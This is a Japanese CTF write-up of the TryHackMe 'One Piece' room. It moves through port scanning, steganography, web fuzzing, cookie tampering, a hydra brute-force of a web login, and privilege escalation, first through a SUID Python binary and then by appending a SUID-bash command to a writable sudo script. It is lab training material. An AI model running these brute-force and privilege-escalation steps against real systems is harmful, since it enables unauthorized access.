# One Piece CTF

https://tryhackme.com/room/ctfonepiece65

## Enumeration

```shell
TARGET=10.48.183.62
sudo bash -c "echo $TARGET   onepiece >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,22,80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

FTP,SSH,HTTP。

### FTP

FTPで3ファイル取得

```sh
$ ls -al
total 28
drwxrwxr-x  2 kali kali 4096 Jan  8 14:18 .
drwxrwxr-x 15 kali kali 4096 Jan  8 14:07 ..
-rw-rw-r--  1 kali kali 8652 Jul 26  2020 .road_poneglyph.jpeg
-rw-rw-r--  1 kali kali 1147 Jul 26  2020 .secret_room.txt
-rw-rw-r--  1 kali kali  187 Jul 26  2020 welcome.txt
```

```sh
$ cat .secret_room.txt              
Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
Nekomamushi: We have hidden this place for centuries.
Inuarashi: Indeed, it holds a secret.
Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
Luffy: A Road Poneglyph ??
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
Luffy: I will show them, there can be only one Pirate King and it will be me !!
Inuarashi: There is another issue regarding the Road Poneglyph.
Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them.
```

```sh
$ stegseek .road_poneglyph.jpeg   
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "road_poneglyphe1.txt".
[i] Extracting to ".road_poneglyph.jpeg.out".

$ cat .road_poneglyph.jpeg.out 
FUWS2LJNE[REDACTED]
```

Base32, Morse, From Binary, From Hex。おそらくこういうのを4つ集めるのだと思われる。

```
3HTXi9i2T2
```

### HTTP

HTMLコメント

```html
<!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5-->
```

Base32,64,85

```
Nami ensures there are precisely 3472 possible places where she could have lost it.
```

3472を素因数分解すると、`2*2*2*2*7*31`。単純に何文字×何桁という数字ではない。

（自力では分からなかったが）、3472で検索すると下記のリポジトリにただりつくという想定らしい。リストを入手。

https://github.com/1FreyR/LogPose/blob/master/LogPose.txt

URLをファジングしたがヒットしなかった。

```sh
$ ffuf -u http://onepiece/FUZZ -w ./LogPose.txt -fc 404  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://onepiece/FUZZ
 :: Wordlist         : FUZZ: /home/kali/ctf/onepiece/LogPose.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

:: Progress: [3472/3472] :: Job [1/1] :: 221 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

拡張子htmlを付けて発見。

```sh
$ gobuster dir -q -x=txt,zip,php,py -u http://onepiece/ -w ./LogPose.txt -t 64 -k

$ gobuster dir -q -x=log,conf,html -u http://onepiece/ -w ./LogPose.txt -t 64 -k
/dr3ssr0s4.html       (Status: 200) [Size: 3985]
```

## /dr3ssr0s4.html

怪しげな画像が表示されている。名前が rabbit_hole.png であり手を付けたくないが、他に手がかりも無いので仕方なく調べる。

```
6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 6f 74 69

m5.J`/{{#F%&!5GI}+n<a

Lhtttavbsw ql gbbzy gfivwwvz
```

```
key:im on oti oti
```

cssからking_kong_gun.jpg を見つけてステガノグラフィー。

```sh
$ strings -n 10 ./king_kong_gun.jpg 
Doflamingo is /ko.jpg
...

$ strings -n 10 ./ko.jpg           
'!p+\}1@cue
Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php
```

## /wh0l3_c4k3.php

Cookie を NoCakeForYouから下記に変えて送ったら、何か返ってきた。

```http
Cookie: cookie=CakeForYou
```

```html
<p>You successfully stole a copy of the 2nd Road Poneglyph: FUWS2LJNEAWS[REDACTED]<br/>

        You succeed to run away but you don't own a Log Pose to go to Kaido's Island, you are sailing without even knowing where you are heading to.<br/>

        You end up reaching a strange island: /r4nd0m.html</p>

I did not expect that.
```

## /r4nd0m.html

js を見たら次のPHPの名前があった

## /0n1g4sh1m4.php

ファイルアップロード機能は、ファイルのコンテンツを送信していないように見える。

kaido.jpeg から抽出。

```sh
$ cat kaido.jpeg.out          
Username:K1ng_0f_th3_B3@sts
```

rockyou.txt でブルートフォース成功。

```sh
root@ip-10-48-80-201:~# hydra $TARGET http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-08 07:08:01
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344398 login tries (l:1/p:14344398), ~478147 tries per task
[DATA] attacking http-post-form://10.48.183.62:80/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR
[STATUS] 8236.00 tries/min, 8236 tries in 00:01h, 14336162 to do in 29:01h, 30 active
[80][http-post-form] host: 10.48.183.62   login: K1ng_0f_th3_B3@sts   password: [REDACTED]
```

ログイン

```html
<p>You successfully stole a copy of the 3rd Road Poneglyph: FYWS2LJNEAX[REDACTED]<br/>
       You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale.
        Unfortunately, the location of this last Poneglyph is unspecified.</p>
```

（自力で分からなかったが）/unspecified が4つ目の場所になっている・・・

```
The last Road Poneglyphe: FUWS2LJ[REDACTED]
```

4つのポーネグリフを全てつなぎ合わせ、from base32, from morse, from binary, from hex, from base58, from base64 でデコード。  
認証情報となり、SSH接続できた。

```
M0nk3y_D_7uffy:[REDACTED]
```

## SSH

```sh
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !
```

SUID

```sh
     5412   4424 -rwsr-xr-x   1 7uffy_vs_T3@ch teach            4526456 Jul 17  2020 /usr/bin/gomugomunooo_king_kobraaa
```

実行してみたら、実体はpython3

```sh
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("ls")
laugh_tale.txt
```

昇格

```sh
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ id
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
```

```sh
$ cat luffy_vs_teach.txt
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his [REDACTED] won the fight.
Now, he needs to find the One Piece.
```

```sh
$ cat .password.txt
7uffy_vs_T3@ch:[REDACTED]
```

teachとしてSSHログイン。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```

目的の場所が分からない。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /root/root.txt
Sorry, I can't tell you where is the One Piece
```

lessコマンドですらないと思われる。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /etc/shadow
Sorry, I can't tell you where is the One Piece
```

読み取り権限が無いので解析は不可。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ ls -al /usr/local/bin/less
-rwxrwx-wx 1 root root 67 Aug 14  2020 /usr/local/bin/less
```

一見書き込みできそうなパーミッションだが、できない。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ ls -al /usr/local/bin/less
-rwxrwx-wx 1 root root 67 Aug 14  2020 /usr/local/bin/less
```

追記はできた。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ echo 'cp /bin/bash /tmp/bash; chmod +sx /tmp/bash' >> /usr/local/bin/less
```

SUIDつきbashを作成成功。

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo /usr/local/bin/less
Sorry, I can't tell you where is the One Piece

7uffy_vs_T3@ch@Laugh-Tale:~$ ls -al /tmp
total 1144
drwxrwxrwt 14 root root    4096 Jan  8 03:30 .
drwxr-xr-x 24 root root    4096 Jul 29  2020 ..
-rwsr-sr-x  1 root root 1113504 Jan  8 03:30 bash
```

```sh
7uffy_vs_T3@ch@Laugh-Tale:~$ /tmp/bash -p
bash-4.4# id
uid=1000(7uffy_vs_T3@ch) gid=1000(teach) euid=0(root) egid=0(root) groups=0(root),1000(teach)
```

最後の答えは検索したら出てくる。※ 最初、/usr/local を除外していたので見つからなかった。

```sh
find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/src/*" -not -path "/snap/*" -not -path "/usr/include/*" -not -path "/var/lib/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "One Piece" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
```

## 振り返り

- OSINTでリストを探させるのは二度とやらないでほしい。
- 公式ウォークスルーでは file コマンドの出力が `writable, executable, regular file, no read permission` であることを理由にlessがバイナリファイルではないと断定しているが、間違っている。readパーミッションが無ければ、バイナリであってもその出力になる。

```sh
$ sudo cp /bin/bash ./                                  

$ sudo chmod 773 ./bash

$ ls -al bash                    
-rwxrwx-wx 1 root root 1302512 Jan  8 17:25 bash

$ file ./bash                                          
./bash: writable, executable, regular file, no read permission
```

## Tags

#tags:puzzle
